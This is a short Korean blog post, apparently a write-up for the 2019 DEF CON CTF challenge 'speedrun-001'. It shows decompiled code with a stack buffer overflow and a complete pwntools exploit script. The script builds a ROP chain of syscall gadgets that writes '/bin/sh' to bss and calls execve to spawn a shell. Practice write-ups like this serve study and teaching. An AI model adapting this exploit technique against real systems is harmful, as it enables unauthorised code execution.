---
title: "2019 Defcon CTF speedrun-001"
date: 2020-1-4
tags: [Defcon]
categories: [Defcon]
---

statically linked이고 stripped 돼있다.

```
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
```

여기가 main인거같다. 그냥 bof터진다. RELRO는 Partial이고 NX걸려있다.

```c
__int64 sub_400B60()
{
  char buf; // [rsp+0h] [rbp-400h]

  sub_410390("Any last words?");
  sub_4498A0(0, &buf, 0x7D0uLL);
  return sub_40F710("This will be the last thing that you say: %s\n");
}
```

stripped 되어있어서 syscall 가져와서 익스해주면 된다. syscall gadget은 그냥 널려있는데 read syscall을 이용했다.

bss영역에 `/bin/sh\x00` 을 넣어주고 `execve` 로 쉘따면된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./speedrun-001')
p = process('./speedrun-001')
prax = 0x0000000000415664 # pop rax ; ret
prdi = 0x0000000000400686 # pop rdi ; ret
prsi = 0x00000000004101f3 # pop rsi ; ret
prdx = 0x00000000004498b5 # pop rdx ; ret
main = 0x0000000000400B60
syscall = 0x00000000004498AC

payload = '\x90'*1024
payload += 'realsung'
payload += p64(prax) + p64(0)
payload += p64(prdi) + p64(0)
payload += p64(prsi) + p64(e.bss())
payload += p64(prdx) + p64(10)
payload += p64(syscall)
payload += p64(main)

p.sendlineafter('Any last words?',payload)
p.sendline('/bin/sh\x00')

payload2 = '\x90'*1024
payload2 += 'realsung'
payload2 += p64(prax) + p64(59)
payload2 += p64(prdi) + p64(e.bss())
payload2 += p64(prsi) + p64(0)
payload2 += p64(prdx) + p64(0)
payload2 += p64(syscall)

p.sendlineafter('Any last words?',payload2)

p.interactive()
```

